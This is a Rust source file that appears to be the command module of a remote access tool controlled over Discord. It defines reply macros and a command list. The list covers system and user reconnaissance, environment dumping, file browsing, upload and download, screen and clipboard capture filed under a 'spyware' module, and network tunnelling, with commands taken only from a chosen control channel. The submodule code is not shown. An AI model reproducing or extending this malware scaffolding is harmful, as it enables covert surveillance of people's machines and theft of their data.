use crate::*;
mod io;
mod network;
mod process;
mod recon;
mod spyware;
mod utils;

#[macro_export]
macro_rules! say {
    ($ctx:expr, $buffer:expr) => {{
        if let Err(why) = $ctx.say($buffer).await {
            error!("Failed to send message: {}", why);
        }
    }};
    ($ctx:expr, $($args:tt)*) => {{
        let message = format!($($args)*);
        say!($ctx, message);
    }};
}

#[macro_export]
macro_rules! unchecked_reply {
    ($ctx:expr, $($args:tt)*) => {{
        $ctx.reply(format!($($args)*)).await
    }};
}

#[macro_export]
macro_rules! reply_as_attachment {
    ($ctx:expr, $filename:expr, $string:expr) => {{
        use poise::serenity_prelude::*;
        let attachment = poise::CreateReply::default()
					.attachment(CreateAttachment::bytes($string.as_bytes(), $filename))
					.reply(true);
        if let Err(why) = $ctx.send(attachment).await {
            error!("Failed to send message: {}", why);
        }
    }};
    ($ctx:expr, $filename:expr, buffer: $buffer:expr) => {{
        use poise::serenity_prelude::*;
        let attachment = poise::CreateReply::default()
					.attachment(CreateAttachment::bytes($buffer, $filename))
					.reply(true);
        if let Err(why) = $ctx.send(attachment).await {
            error!("Failed to send message: {}", why);
        }
    }};
    ($ctx:expr, $filename:expr, $($args:tt)*) => {{
        use poise::serenity_prelude::*;
        let m = format!($($args)*);
        let attachment = poise::CreateReply::default()
					.attachment(CreateAttachment::bytes(m.as_bytes(), $filename))
					.reply(true);
        if let Err(why) = $ctx.send(attachment).await {
            error!("Failed to send message: {}", why);
        }
    }};

    ($ctx:expr, $($args:tt)*) => {{
        reply_as_attachment!($ctx, "message.txt", $($args)*)
    }};
}
#[macro_export]
macro_rules! checked_reply {
    ($ctx:expr, $($args:tt)*) => {{
        use poise::serenity_prelude::*;
        let m = format!($($args)*);
        if m.len() >= $crate::utils::logging::DISCORD_MAX_MESSAGE_LENGTH {
            reply_as_attachment!($ctx, filename: "message.txt", buffer: m.as_bytes())
        } else {
            $ctx.reply(m).await
        };

    }};
    (filename: $filename:expr, $ctx:expr, $($args:tt)*) => {{
        let m = format!($($args)*);
        if m.len() >= $crate::utils::logging::DISCORD_MAX_MESSAGE_LENGTH {
            reply_as_attachment!($ctx, filename: $filename, buffer: m.as_bytes())
        } else {
            $ctx.reply(m).await?;
        }
    }};
}

pub const COMMANDS: &[fn() -> poise::Command<crate::Data, crate::Error>] = &[
    utils::help,
    utils::clear,
    recon::config,
    recon::users,
    recon::sysinfo,
    recon::ifconfig,
    recon::env,
    process::ps,
    process::pwd,
    process::cd,
    process::ls,
    io::download,
    io::upload,
    io::cat,
    io::write,
    io::mkdir,
    io::rm,
    spyware::screen,
    spyware::clipboard,
    network::tunnel,
];

/// Check which should be applied to all commands coming from the command chanel
pub async fn command_channel_check(ctx: RuscordContext<'_>) -> RuscordResult<bool> {
    let invocation_cid = ctx.channel_id();
    let data = ctx.data();
    let command_cid = {
        let guard = data.config.read().await;
        guard.command_channel_id.id()
    };

    if invocation_cid != command_cid {
        return Ok(false);
    }
    Ok(true)
}
